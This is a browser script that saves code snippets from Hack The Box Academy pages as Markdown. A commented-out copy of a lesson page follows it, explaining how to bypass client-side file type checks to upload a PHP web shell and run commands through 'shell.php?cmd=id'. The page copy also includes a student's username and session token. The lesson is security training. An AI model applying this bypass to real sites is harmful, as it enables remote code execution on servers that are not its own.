// Function to check if the cheat sheet button is present
function isCheatSheetButtonPresent() {
  var button = document.querySelector(
    'button[data-toggle="modal"][data-target="#cheatSheetModal"]'
  );
  return button !== null;
}

// Function to extract code snippets and headers
function extractCodeSnippetsWithHeaders() {
  // Initialize variables to store Markdown content and header levels
  var markdownContent = "";
  var currentHeaderLevel = 0;
  var foundTableOfContents = false;

  // Find all <h1>, <h2>, <h3>, ... <pre> elements
  var elements = document.querySelectorAll("h1, h2, h3, h4, h5, h6, pre");

  // Loop through each element
  elements.forEach(function (element) {
    if (element.tagName.startsWith("H")) {
      // Extract header text and determine header level
      var headerLevel = parseInt(element.tagName.substring(1));
      var headerText = element.textContent.trim();

      // Check if the element is the "Table of Contents" section
      if (element.textContent.trim() === "Table of Contents") {
        foundTableOfContents = true;
      }

      // Stop adding content if "Table of Contents" section is found
      if (foundTableOfContents) {
        return;
      }

      // Adjust header levels if necessary
      if (headerLevel > currentHeaderLevel) {
        markdownContent +=
          "#".repeat(headerLevel - currentHeaderLevel) +
          " " +
          headerText +
          "\n\n";
      } else if (headerLevel < currentHeaderLevel) {
        markdownContent +=
          "#".repeat(currentHeaderLevel - headerLevel) +
          " " +
          headerText +
          "\n\n";
      } else {
        markdownContent += "#".repeat(headerLevel) + " " + headerText + "\n\n";
      }

      currentHeaderLevel = headerLevel;
    } else {
      // Extract and format code snippets
      var codeSnippet = element.textContent.trim();
      var language = element.classList[0].replace("language-", "");

      if (language==="shell-session"){language="bash"}; // Change shell-session to bash

      // Add code snippet to Markdown content
      markdownContent += "```" + language + "\n";
      markdownContent += codeSnippet + "\n";
      markdownContent += "```\n\n";
    }
  });

  // Return the Markdown content
  return markdownContent;
}

// Get the URL of the page
var url = window.location.href;
// Extract module and section numbers from the URL
var match = url.match(/module\/(\d+)\/section\/(\d+)/);
if (match) {
  var moduleNumber = match[1];
  var sectionNumber = match[2];
  // Construct the filename based on the module and section numbers
  var filename = `module-${moduleNumber}-section-${sectionNumber}.md`;

  // Check if the cheat sheet button is present
  if (isCheatSheetButtonPresent()) {
    // Wait for the FileSaver.js library to load
    var script = document.createElement("script");
    script.onload = function () {
      // Extract code snippets and headers
      var extractedContent = extractCodeSnippetsWithHeaders();
      // Save the extracted content to a local Markdown file
      var blob = new Blob([extractedContent], {
        type: "text/plain;charset=utf-8",
      });
      saveAs(blob, filename);
    };
    script.src = "https://cdn.jsdelivr.net/npm/file-saver";
    document.head.appendChild(script);
  } else {
    console.log("Cheat sheet button not found.");
  }
} else {
  console.log("URL format not recognized.");
}

// TODO
// - make ...SNIP... comments in each language
// - add questions and answers
// - fix empty #
// - Cheat sheet button present doesn't download the file
// - Create a Tampermonkey Script
// Next, we need to create a Tampermonkey script to inject the JavaScript code into the Hack The Box page. Tampermonkey is a popular userscript manager that allows you to run custom JavaScript on webpages.
// Here's an example Tampermonkey script that injects the JavaScript code into the Hack The Box page:


// EXAMPLE PAGE SOURCE

// <!doctype html>
// <html lang="en">
// <head>
// <meta charset="utf-8" />
// <title>File Upload Attacks</title>
// <meta name="viewport" content="width=device-width, initial-scale=1.0">
// <meta content="Premium Multipurpose Admin & Dashboard Template" name="description" />
// <meta content="Themesbrand" name="author" />
// <link rel="shortcut icon" href="/images/favicon.ico">
// <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
// <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
// <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
// <link rel="mask-icon" href="/images/safari-pinned-tab.svg">
// <link rel="preload" as="style" href="https://academy.hackthebox.com/build/assets/bootstrap-dark-37a520b2.css" /><link rel="preload" as="style" href="https://academy.hackthebox.com/build/assets/app-dark-85a271d1.css" /><link rel="preload" as="style" href="https://academy.hackthebox.com/build/assets/icons-541b9943.css" /><link rel="preload" as="style" href="https://academy.hackthebox.com/build/assets/prism-8ad01d51.css" /><link rel="stylesheet" href="https://academy.hackthebox.com/build/assets/bootstrap-dark-37a520b2.css" /><link rel="stylesheet" href="https://academy.hackthebox.com/build/assets/app-dark-85a271d1.css" /><link rel="stylesheet" href="https://academy.hackthebox.com/build/assets/icons-541b9943.css" /><link rel="stylesheet" href="https://academy.hackthebox.com/build/assets/prism-8ad01d51.css" />
// <link href="/assets/libs/toastr/toastr.min.css" rel="stylesheet" type="text/css" />
// <link rel="stylesheet" href="https://use.typekit.net/ryt3opf.css">
// <link rel="stylesheet" href="https://kit.fontawesome.com/8161086d56.css" crossorigin="anonymous">
// <script>
//     !function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{analytics.invoked=!0;analytics.methods=["trackSubmit","trackClick","trackLink","trackForm","pageview","identify","reset","group","track","ready","alias","debug","page","once","off","on","addSourceMiddleware","addIntegrationMiddleware","setAnonymousId","addDestinationMiddleware"];analytics.factory=function(e){return function(){var t=Array.prototype.slice.call(arguments);t.unshift(e);analytics.push(t);return analytics}};for(var e=0;e<analytics.methods.length;e++){var key=analytics.methods[e];analytics[key]=analytics.factory(key)}analytics.load=function(key,e){var t=document.createElement("script");t.type="text/javascript";t.async=!0;t.src="https://cdn.segment.com/analytics.js/v1/" + key + "/analytics.min.js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(t,n);analytics._loadOptions=e};analytics._writeKey="eLzeD0QoARKZ42pc8AGEUYpcFLpYkf0I";analytics.SNIPPET_VERSION="4.13.2";
//             analytics.load("eLzeD0QoARKZ42pc8AGEUYpcFLpYkf0I");
//                                             properties = {"platform":"Academy","platform_version":"V1","module_id":136,"module_name":"File Upload Attacks","module_difficulty":"Medium","section_id":1280,"section_title":"Client-Side Validation"};
//                                     analytics.page(
//                 "Module",
//                 properties
//             );
//                                 }
//     }();
// </script>
// <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-select@1.13.14/dist/css/bootstrap-select.min.css">
// <style>
//     .website-screenshot-url {
//         height: 22px;
//         cursor: text;
//         padding-left: 10px;
//     }

//     .iterminal {
//         position: fixed;
//         bottom: 0;
//         z-index: 100;
//         width: 100%;
//         left: 0;
//     }


//     .page-head {
//         display: none;
//     }

//     .btn-circle {
//         width: 25px;
//         height: 25px;
//         padding: 6px 0px;
//         border-radius: 15px;
//         text-align: center;
//         font-size: 9px;
//         line-height: 1.42857;
//     }
// </style>
// <script src="https://www.google.com/recaptcha/api.js?render=6LeI6LsaAAAAAKgdStgBC6B4UVbXlpYNaYGN46Ah"></script>
// </head>
// <body data-layout="detached" data-topbar="colored">
// <div id="global-alert-notification" class="global-alert-banner-container">
// <div class="alert-notification-banner global warning">
// <div class="d-flex justify-content-between w-100 h-100 alert-body">
// <div class="d-flex align-items-center justify-content-center">
// <div class="warning global-icon-wrapper align-self-center">
// <i class="fa fa-exclamation-triangle"></i>
// </div>
// <p class="alert-body-content d-flex flex-column justify-content-center mb-0">
// <span class="title warning">To keep your account secure, move your 2FA to HTB Account by June 27th</span>
// <span class="message warning">The 2FA of Academy, will be disabled soon, so be sure you have 2FA enabled on SSO side.</span>
// </p>
// </div>
// <a href="https://account.hackthebox.com/security-settings" class="align-self-center alert-link warning">Enable now
// </a>
// </div>
// </div>
// </div>
// <div class="container-fluid">
// <div id="layout-wrapper" class="global-alert-visible">
// <header id="page-topbar" class="global-alert-visible">
// <div class="navbar-header">
// <div class="container-fluid">
// <div class="d-flex align-items-center justify-content-between">
// <div class="d-flex align-items-center">
// <div class="navbar-brand-box">
// <a href="https://academy.hackthebox.com/dashboard" class="logo">
// <span class="logo-sm">
// <img src="/images/new-logo-htb.svg" alt height="30">
// </span>
// <span class="logo-md">
// <img src="/images/logo.svg" alt height="30">
// </span>
// <span class="logo-lg">
// <img src="/images/logo.svg" alt height="36">
// </span>
// </a>
// </div>
// <div class="d-flex align-items-center">
// <button type="button" class="btn btn-sm font-size-16 header-item toggle-btn waves-effect" id="vertical-menu-btn">
// <i class="fa fa-fw fa-bars"></i>
// </button>
// </div>
// <div class="topnav">
// <nav class="navbar navbar-light navbar-expand-lg topnav-menu">
// <div class="collapse navbar-collapse" id="topnav-menu-content">
// <ul class="navbar-nav active">
// <li class="nav-item">
// <a class="nav-link" href="https://academy.hackthebox.com/dashboard"><i class="mdi mdi-monitor-dashboard"></i> Dashboard</a>
// </li>
// <li class="nav-item">
// <a class="nav-link" href="https://academy.hackthebox.com/modules"><i class="mdi mdi-book-open"></i>
// Modules</a>
// </li>
// <li class="nav-item">
// <a class="nav-link" href="https://academy.hackthebox.com/paths"><i class="mdi mdi-map-marker-path"></i> Paths</a>
// </li>
// </ul>
// </div>
// </nav>
// </div>
// </div>
// <div class="float-right">
// <div class="dropdown d-none d-lg-inline-block ml-1">
// <a href="https://academy.hackthebox.com/billing">
// <button type="button" class="btn btn-extra-light">
// <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;Purchase Cubes
// </button>
// </a>
// </div>
// <div class="dropdown d-none d-lg-inline-block ml-1">
// <button type="button" class="btn header-item noti-icon waves-effect" data-toggle="fullscreen">
// <i class="mdi mdi-fullscreen fullscreen-icon"></i>
// </button>
// </div>
// <div class="dropdown d-inline-block">
// <button type="button" class="btn header-item waves-effect" id="page-header-user-dropdown" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
// <img class="rounded-circle header-profile-user" src="https://www.gravatar.com/avatar/81a0283e788b4a4f3ed22cb92ecfc2f9?d=robohash" alt="Header Avatar">
// <span class="d-none d-xl-inline-block ml-1">ndefstathiou</span>
// <i class="mdi mdi-chevron-down d-none d-xl-inline-block"></i>
// </button>
// <div class="dropdown-menu dropdown-menu-right">
// <a class="dropdown-item" href="https://academy.hackthebox.com/billing"><i class="bx bx-wallet font-size-16 align-middle mr-1"></i> Billing</a>
// <a class="dropdown-item d-block" href="https://academy.hackthebox.com/settings"><i class="bx bx-wrench font-size-16 align-middle mr-1"></i> Settings</a>
// <a class="dropdown-item d-block" href="https://academy.hackthebox.com/vpn"><i class="bx bx-server font-size-16 align-middle mr-1"></i> VPN Settings</a>
// <a class="dropdown-item d-block" href="https://academy.hackthebox.com/htb-account-settings"><i class="bx bx-server font-size-16 align-middle mr-1"></i> HTB Account Settings</a>
// <div class="dropdown-divider"></div>
// <form method="POST" action="https://academy.hackthebox.com/logout"> <input type="hidden" name="_token" value="RYPoLgf5o4PSLRshDqoein6i6b0yWF7CYcaHjSJX" autocomplete="off"> <a class="dropdown-item text-danger log-out" href="#"><i class="bx bx-power-off font-size-16 align-middle mr-1 text-danger"></i> Logout</a>
// </form>
// </div>
// </div>
// </div>
// </div>
// </div>
// </div>
// </header>
// <div class="vertical-menu overflow-hidden  d-lg-none   global-alert-visible ">
// <div class="vertical-menu-overlay"></div>
// <div class="h-100 overflow-auto">
// <div class="user-wid text-center py-4">
// <div class="user-img">
// <img src="https://www.gravatar.com/avatar/81a0283e788b4a4f3ed22cb92ecfc2f9?d=robohash" alt class="avatar-md mx-auto rounded-circle">
// </div>
// <div class="mt-3">
// <p class="text-dark mb-0 font-weight-medium font-size-16">ndefstathiou</p>
// <p class="text-body mt-1 mb-1">
// Student
// </p>
// <p>
// <span class="custom-badge custom-badge-soft-secondary" data-toggle="tooltip" data-title="Cubes">
// <i class="fad fa-cube text-success mr-1"></i>
// <span class="cubeBalance">
// 596
// </span>
// </span>
// </p>
// </div>
// </div>
// <div id="sidebar-menu">
// <ul class="metismenu list-unstyled" id="side-menu">
// <li class="menu-title">Learn</li>
// <li><a class="navDashboard" href="https://academy.hackthebox.com/dashboard"><i class="mdi mdi-monitor-dashboard"></i> Dashboard</a></li>
// <li>
// <a class="navDashboard" href="https://academy.hackthebox.com/exams"><i class="mdi mdi-certificate"></i>
// Exams</a></li>
// <li>
// <a class="navModules" href="javascript: void(0);" class="has-arrow waves-effect">
// <i class="mdi mdi-book-open"></i>
// <span>Modules</span>
// </a>
// <ul class="sub-menu mm-collapse" aria-expanded="false">
// <li><a href="https://academy.hackthebox.com/modules"><i class="mdi mdi-book-open"></i> All Modules</a>
// </li>
// <li>
// <a href="https://academy.hackthebox.com/modules/inprogress"><i class="mdi mdi-progress-upload"></i>
// In-Progress Modules</a></li>
// <li><a href="https://academy.hackthebox.com/modules/locked"><i class="mdi mdi-account-arrow-left-outline"></i> Available
// Modules</a>
// </li>
// <li>
// <a href="https://academy.hackthebox.com/modules/unlocked"><i class="mdi mdi-account-check-outline"></i>
// Owned
// Modules</a></li>
// <li>
// <a href="https://academy.hackthebox.com/modules/changelog"><i class="mdi mdi-playlist-check"></i>
// Change Log</a></li>
// </ul>
// </li>
// <li class="pathsLink">
// <a class="navPaths" href="javascript: void(0);" class="has-arrow waves-effect">
// <i class="mdi mdi-map-marker-path"></i>
// <span>Paths</span>
// </a>
// <ul class="sub-menu mm-collapse" aria-expanded="false">
// <li class="skillPathsLink"><a href="https://academy.hackthebox.com/paths"><i class="mdi mdi-chart-line-variant"></i> Skill Paths</a></li>
// <li class="jobRolePathsLink"><a href="https://academy.hackthebox.com/paths/jobrole"><i class="mdi mdi-briefcase"></i> Job Role Paths</a></li>
// </ul>
// </li>
// <li>
// <a class="navDashboard" href="https://academy.hackthebox.com/academy-relations"><i class="mdi mdi-sitemap"></i>
// Academy x HTB Labs</a>
// </li>
// <li class="menu-title">My Achievements</li>
// <li>
// <a class="navDashboard" href="https://academy.hackthebox.com/my-certificates"><i class="mdi mdi-certificate"></i>
// My Certificates </a></li>
// <li>
// <li>
// <a class="navDashboard" href="https://academy.hackthebox.com/my-badges"><i class="mdi mdi-trophy"></i>
// My Badges </a>
// </li>
// <li>
// <li class="menu-title">Referrals</li>
// <li>
// <a class="navDashboard" href="https://academy.hackthebox.com/referral">
// <i class="mdi mdi-gift"></i> Invite friends
// <span class="badge mx-3 bg-success text-light font-size-11">NEW</span>
// </a>
// <li>
// <li>
// <li class="menu-title">Get Help</li>
// <li>
// <a class="navSupport" href="http://help.hackthebox.eu/" rel="noopener nofollow norefferer" target="_blank"><i class="mdi mdi-help-box"></i>Help Center</a></li>
// <li><a class="navSupport" data-toggle="tooltip" href="https://academy.hackthebox.com/faq"><i class="mdi mdi-help-circle"></i> FAQ</a></li>
// <li><a class="navSupport" href="https://discord.gg/hackthebox" rel="noopener nofollow norefferer" target="_blank"><i class="mdi mdi-discord"></i>
// Discord</a></li>
// </ul>
// </div>
// </div>
// </div>
// <div class="vertical-menu overflow-hidden  d-lg-none   global-alert-visible ">
// <div class="vertical-menu-overlay"></div>
// <div class="h-100 overflow-auto">
// <div class="user-wid text-center py-4">
// <div class="user-img">
// <img src="https://www.gravatar.com/avatar/81a0283e788b4a4f3ed22cb92ecfc2f9?d=robohash" alt class="avatar-md mx-auto rounded-circle">
// </div>
// <div class="mt-3">
// <p class="text-dark mb-0 font-weight-medium font-size-16">ndefstathiou</p>
// <p class="text-body mt-1 mb-1">
// Student
// </p>
// <p>
// <span class="custom-badge custom-badge-soft-secondary" data-toggle="tooltip" data-title="Cubes">
// <i class="fad fa-cube text-success mr-1"></i>
// <span class="cubeBalance">
// 596
// </span>
// </span>
// </p>
// </div>
// </div>
// <div id="sidebar-menu">
// <ul class="metismenu list-unstyled" id="side-menu">
// <li class="menu-title">Learn</li>
// <li><a class="navDashboard" href="https://academy.hackthebox.com/dashboard"><i class="mdi mdi-monitor-dashboard"></i> Dashboard</a></li>
// <li>
// <a class="navDashboard" href="https://academy.hackthebox.com/exams"><i class="mdi mdi-certificate"></i>
// Exams</a></li>
// <li>
// <a class="navModules" href="javascript: void(0);" class="has-arrow waves-effect">
// <i class="mdi mdi-book-open"></i>
// <span>Modules</span>
// </a>
// <ul class="sub-menu mm-collapse" aria-expanded="false">
// <li><a href="https://academy.hackthebox.com/modules"><i class="mdi mdi-book-open"></i> All Modules</a>
// </li>
// <li>
// <a href="https://academy.hackthebox.com/modules/inprogress"><i class="mdi mdi-progress-upload"></i>
// In-Progress Modules</a></li>
// <li><a href="https://academy.hackthebox.com/modules/locked"><i class="mdi mdi-account-arrow-left-outline"></i> Available
// Modules</a>
// </li>
// <li>
// <a href="https://academy.hackthebox.com/modules/unlocked"><i class="mdi mdi-account-check-outline"></i>
// Owned
// Modules</a></li>
// <li>
// <a href="https://academy.hackthebox.com/modules/changelog"><i class="mdi mdi-playlist-check"></i>
// Change Log</a></li>
// </ul>
// </li>
// <li class="pathsLink">
// <a class="navPaths" href="javascript: void(0);" class="has-arrow waves-effect">
// <i class="mdi mdi-map-marker-path"></i>
// <span>Paths</span>
// </a>
// <ul class="sub-menu mm-collapse" aria-expanded="false">
// <li class="skillPathsLink"><a href="https://academy.hackthebox.com/paths"><i class="mdi mdi-chart-line-variant"></i> Skill Paths</a></li>
// <li class="jobRolePathsLink"><a href="https://academy.hackthebox.com/paths/jobrole"><i class="mdi mdi-briefcase"></i> Job Role Paths</a></li>
// </ul>
// </li>
// <li>
// <a class="navDashboard" href="https://academy.hackthebox.com/academy-relations"><i class="mdi mdi-sitemap"></i>
// Academy x HTB Labs</a>
// </li>
// <li class="menu-title">My Achievements</li>
// <li>
// <a class="navDashboard" href="https://academy.hackthebox.com/my-certificates"><i class="mdi mdi-certificate"></i>
// My Certificates </a></li>
// <li>
// <li>
// <a class="navDashboard" href="https://academy.hackthebox.com/my-badges"><i class="mdi mdi-trophy"></i>
// My Badges </a>
// </li>
// <li>
// <li class="menu-title">Referrals</li>
// <li>
// <a class="navDashboard" href="https://academy.hackthebox.com/referral">
// <i class="mdi mdi-gift"></i> Invite friends
// <span class="badge mx-3 bg-success text-light font-size-11">NEW</span>
// </a>
// <li>
// <li>
// <li class="menu-title">Get Help</li>
// <li>
// <a class="navSupport" href="http://help.hackthebox.eu/" rel="noopener nofollow norefferer" target="_blank"><i class="mdi mdi-help-box"></i>Help Center</a></li>
// <li><a class="navSupport" data-toggle="tooltip" href="https://academy.hackthebox.com/faq"><i class="mdi mdi-help-circle"></i> FAQ</a></li>
// <li><a class="navSupport" href="https://discord.gg/hackthebox" rel="noopener nofollow norefferer" target="_blank"><i class="mdi mdi-discord"></i>
// Discord</a></li>
// </ul>
// </div>
// </div>
// </div>
// <div class="main-content">
// <div class="page-content">
// <div class="iterminal d-none">
// <div id="appVue"></div>
// </div>
// <div class="row">
// <div class="col-12">
// <div class="page-title-box d-flex align-items-center justify-content-between">
// <h4 class="page-title mb-0 font-size-18 letter-spacing-1-2">File Upload Attacks
// &nbsp;
// <i style="cursor:pointer;" data-module-id="136" data-toggle="tooltip" data-title="Toggle To-Do" class="favouriteBtn  fa-sharp fa-solid  fa-heart text-danger"></i>
// </h4>
// <div class="page-title-right">
// <ol class="breadcrumb m-0">
// <li class="breadcrumb-item"><a href="javascript: void(0);">Page 4</a></li>
// <li class="breadcrumb-item active">Client-Side Validation</li>
// </ol>
// </div>
// </div>
// </div>
// </div>
// <div class="row justify-content-xl-center">
// <div class="col-md-12 col-xl-9 col-xxl-7">
// <div class="training-module">
// <h1>Client-Side Validation</h1>
// <hr/>
// <p>Many web applications only rely on front-end JavaScript code to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format (e.g., not an image).</p>
// <p>However, as the file format validation is happening on the client-side, we can easily bypass it by directly interacting with the server, skipping the front-end validations altogether. We may also modify the front-end code through our browser's dev tools to disable any validation in place.</p>
// <hr/>
// <h2>Client-Side Validation</h2>
// <p>The exercise at the end of this section shows a basic <code>Profile Image</code> functionality, frequently seen in web applications that utilize user profile features, like social media web applications:
// <img class="website-screenshot" data-url="http://SERVER_IP:PORT/" src="/storage/modules/136/file_uploads_profile_image_upload.jpg"></p>
// <p>However, this time, when we get the file selection dialog, we cannot see our <code>PHP</code> scripts (or it may be greyed out), as the dialog appears to be limited to image formats only:
// <img class="website-screenshot" data-url="http://SERVER_IP:PORT/" src="/storage/modules/136/file_uploads_select_file_types.jpg"></p>
// <p>We may still select the <code>All Files</code> option to select our <code>PHP</code> script anyway, but when we do so, we get an error message saying (<code>Only images are allowed!</code>), and the <code>Upload</code> button gets disabled:
// <img class="website-screenshot" data-url="http://SERVER_IP:PORT/" src="/storage/modules/136/file_uploads_select_denied.jpg"></p>
// <p>This indicates some form of file type validation, so we cannot just upload a web shell through the upload form as we did in the previous section. Luckily, all validation appears to be happening on the front-end, as the page never refreshes or sends any HTTP requests after selecting our file. So, we should be able to have complete control over these client-side validations.</p>
// <p>Any code that runs on the client-side is under our control. While the web server is responsible for sending the front-end code, the rendering and execution of the front-end code happen within our browser. If the web application does not apply any of these validations on the back-end, we should be able to upload any file type.</p>
// <p>As mentioned earlier, to bypass these protections, we can either <code>modify the upload request to the back-end server</code>, or we can <code>manipulate the front-end code to disable these type validations</code>.</p>
// <hr/>
// <h2>Back-end Request Modification</h2>
// <p>Let's start by examining a normal request through <code>Burp</code>. When we select an image, we see that it gets reflected as our profile image, and when we click on <code>Upload</code>, our profile image gets updated and persists through refreshes. This indicates that our image was uploaded to the server, which is now displaying it back to us:
// <img class="website-screenshot" data-url="http://SERVER_IP:PORT/" src="/storage/modules/136/file_uploads_normal_request.jpg"></p>
// <p>If we capture the upload request with <code>Burp</code>, we see the following request being sent by the web application:
// <img class="website-screenshot" data-url="http://SERVER_IP:PORT/" src="/storage/modules/136/file_uploads_image_upload_request.jpg"></p>
// <p>The web application appears to be sending a standard HTTP upload request to <code>/upload.php</code>. This way, we can now modify this request to meet our needs without having the front-end type validation restrictions. If the back-end server does not validate the uploaded file type, then we should theoretically be able to send any file type/content, and it would be uploaded to the server.</p>
// <p>The two important parts in the request are <code>filename=&quot;HTB.png&quot;</code> and the file content at the end of the request. If we modify the <code>filename</code> to <code>shell.php</code> and modify the content to the web shell we used in the previous section; we would be uploading a <code>PHP</code> web shell instead of an image.</p>
// <p>So, let's capture another image upload request, and then modify it accordingly:
// <img class="website-screenshot" data-url="http://SERVER_IP:PORT/" src="/storage/modules/136/file_uploads_modified_upload_request.jpg"></p>
// <div class="card bg-light">
// <div class="card-body">
// <p class="mb-0"><b>Note:</b> We may also modify the <code>Content-Type</code> of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.</p>
// </div>
// </div>
// <p>As we can see, our upload request went through, and we got <code>File successfully uploaded</code> in the response. So, we may now visit our uploaded file and interact with it and gain remote code execution.</p>
// <hr/>
// <h2>Disabling Front-end Validation</h2>
// <p>Another method to bypass client-side validations is through manipulating the front-end code. As these functions are being completely processed within our web browser, we have complete control over them. So, we can modify these scripts or disable them entirely. Then, we may use the upload functionality to upload any file type without needing to utilize <code>Burp</code> to capture and modify our requests.</p>
// <p>To start, we can click [<code>CTRL+SHIFT+C</code>] to toggle the browser's <code>Page Inspector</code>, and then click on the profile image, which is where we trigger the file selector for the upload form:
// <img class="website-screenshot" data-url="http://SERVER_IP:PORT/" src="/storage/modules/136/file_uploads_element_inspector.jpg"></p>
// <p>This will highlight the following HTML file input on line <code>18</code>:</p>
// <pre><code class="language-html">&lt;input type=&quot;file&quot; name=&quot;uploadFile&quot; id=&quot;uploadFile&quot; onchange=&quot;checkFile(this)&quot; accept=&quot;.jpg,.jpeg,.png&quot;&gt;
// </code></pre>
// <p>Here, we see that the file input specifies (<code>.jpg,.jpeg,.png</code>) as the allowed file types within the file selection dialog. However, we can easily modify this and select <code>All Files</code> as we did before, so it is unnecessary to change this part of the page.</p>
// <p>The more interesting part is <code>onchange=&quot;checkFile(this)&quot;</code>, which appears to run a JavaScript code whenever we select a file, which appears to be doing the file type validation. To get the details of this function, we can go to the browser's <code>Console</code> by clicking [<code>CTRL+SHIFT+K</code>], and then we can type the function's name (<code>checkFile</code>) to get its details:</p>
// <pre><code class="language-javascript">function checkFile(File) {
// ...SNIP...
//     if (extension !== 'jpg' &amp;&amp; extension !== 'jpeg' &amp;&amp; extension !== 'png') {
//         $('#error_message').text(&quot;Only images are allowed!&quot;);
//         File.form.reset();
//         $(&quot;#submit&quot;).attr(&quot;disabled&quot;, true);
//     ...SNIP...
//     }
// }
// </code></pre>
// <p>The key thing we take from this function is where it checks whether the file extension is an image, and if it is not, it prints the error message we saw earlier (<code>Only images are allowed!</code>) and disables the <code>Upload</code> button. We can add <code>PHP</code> as one of the allowed extensions or modify the function to remove the extension check.</p>
// <p>Luckily, we do not need to get into writing and modifying JavaScript code. We can remove this function from the HTML code since its primary use appears to be file type validation, and removing it should not break anything.</p>
// <p>To do so, we can go back to our inspector, click on the profile image again, double-click on the function name (<code>checkFile</code>) on line <code>18</code>, and delete it:</p>
// <img class="website-screenshot" data-url="http://SERVER_IP:PORT/" src="/storage/modules/136/file_uploads_removed_js_function.jpg">
// <div class="card bg-light">
// <div class="card-body">
// <p class="mb-0"><b>Tip:</b> You may also do the same to remove <code>accept=".jpg,.jpeg,.png"</code>, which should make selecting the <code>PHP</code> shell easier in the file selection dialog, though this is not mandatory, as mentioned earlier.</p>
// </div>
// </div>
// <p>With the <code>checkFile</code> function removed from the file input, we should be able to select our <code>PHP</code> web shell through the file selection dialog and upload it normally with no validations, similar to what we did in the previous section.</p>
// <div class="card bg-light">
// <div class="card-body">
// <p class="mb-0"><b>Note:</b> The modification we made to the source code is temporary and will not persist through page refreshes, as we are only changing it on the client-side. However, our only need is to bypass the client-side validation, so it should be enough for this purpose.</p>
// </div>
// </div>
// <p>Once we upload our web shell using either of the above methods and then refresh the page, we can use the <code>Page Inspector</code> once more with [<code>CTRL+SHIFT+C</code>], click on the profile image, and we should see the URL of our uploaded web shell:</p>
// <pre><code class="language-html">&lt;img src=&quot;/profile_images/shell.php&quot; class=&quot;profile-image&quot; id=&quot;profile-image&quot;&gt;
// </code></pre>
// <p>If we can click on the above link, we will get to our uploaded web shell, which we can interact with to execute commands on the back-end server:</p>
// <img class="website-screenshot" data-url="http://SERVER_IP:PORT/profile_images/shell.php?cmd=id" src="/storage/modules/136/file_uploads_php_manual_shell.jpg">
// <div class="card bg-light">
// <div class="card-body">
// <p class="mb-0"><b>Note:</b> The steps shown apply to Firefox, as other browsers may have slightly different methods for applying local changes to the source, like the use of <code>overrides</code> in Chrome.</p>
// </div>
// </div>
// <div class="mb-5 pwnbox-select-card"></div>
// <div id="screen" style="height: 600px; border: 1px solid;">
// <div class="screenPlaceholder">
// <div class="instanceLoading" style="display: none;">
// <h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
// </h1>
// <div class="text-center">Instance is starting...</div>
// </div>
// <div class="instanceTerminating" style="display: none;">
// <h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
// </h1>
// <div class="text-center">Terminating instance...</div>
// </div>
// <div class="row instanceStart max-width-canvas">
// <div class="col-4"></div>
// <div class="col-4">
// <button class="startInstanceBtn btn btn-success text-light btn-lg btn-block " style="margin-top: 270px;">Start Instance
// </button>
// <p class="text-center mt-2 font-size-13 font-secondary">
// <span class="text-success spawnsLeft">
// <i class="fal fa-infinity"></i>
// </span> / 1 spawns left
// </p>
// </div>
// <div class="col-4"></div>
// </div>
// </div>
// </div>
// <div class="row align-center justify-center my-4">
// <div class="col-5 justify-start">
// <button style="display:none;" target="_blank" class="instance-button fullScreenBtn btn btn-light btn-sm float-left "><i class="fad fa-expand text-success mr-1"></i> &nbsp;Full Screen
// </button>
// <button style="display:none;" class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2"><i class="fad fa-times text-danger"></i> &nbsp;Terminate
// </button>
// <button style="display:none;" class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1"><i class="fad fa-sync text-warning mr-2"></i> &nbsp;Reset
// </button>
// <div class="btn-group " role="group">
// <button style="display:none;cursor: default;" class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1">Life Left:
// <span class="lifeLeft"></span>m
// </button>
// <button style="display:none;" data-toggle="tooltip" data-title="Extend Life" class=" extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm "><i class="fa fa-plus text-success"></i></button>
// </div>
// </div>
// <div id="statusText" class="col-7 justify-end pt-2 pr-2 font-size-small text-right">Waiting to
// start...
// </div>
// </div>
// <div id="solutionsModuleSetting" class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets">
// <div class="border border-secondary p-2 rounded">
// <div class="custom-control custom-switch d-flex">
// <input type="checkbox" class="custom-control-input" id="showSolutionsModuleSetting" disabled>
// <label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
// Enable step-by-step solutions for all questions
// </label>
// <span class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-trigger="click" data-placement="top" data-toggle="popover" data-html="true" title="Activate Solutions" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href=&#039;/billing&#039;&gt;here&lt;/a&gt;." aria-hidden="true">
// <i class="fa fa-info-circle font-size-12"></i>
// </span>
// <img src="/images/sparkles-solid.svg" alt="sparkles-icon-decoration" height="20" class="ml-2 w-auto sparkles-icon" />
// </div>
// </div>
// </div>
// <div class="card" id="questionsDiv">
// <div class="card-body">
// <div class="row">
// <div class="col-9">
// <h4 class="card-title mt-0 font-size-medium">Questions</h4>
// <p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
// to complete this Section and earn cubes!</p>
// <span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
// system!</span>
// <p class="card-title-desc font-size-large font-size-15 mb-0">
// Target(s): <span class="text-success">
// <span class="target" style="cursor:pointer;">
// <i class="fad fa-circle-notch fa-spin"></i>
// <span class="spawnTargetBtn">Fetching status...</span>
// </span>
// </span>
// <button class="resetTargetBtn btn btn-light btn-sm" data-toggle="tooltip" data-title="Reset Target(s)" style="cursor: pointer; display: none;">
// <i class="fad fa-sync text-warning"></i>
// </button>
// <br>
// <div class="d-flex align-items-center targetLifeContainer">
// <span class="targetLifeTimeContainer" style="display: none;">
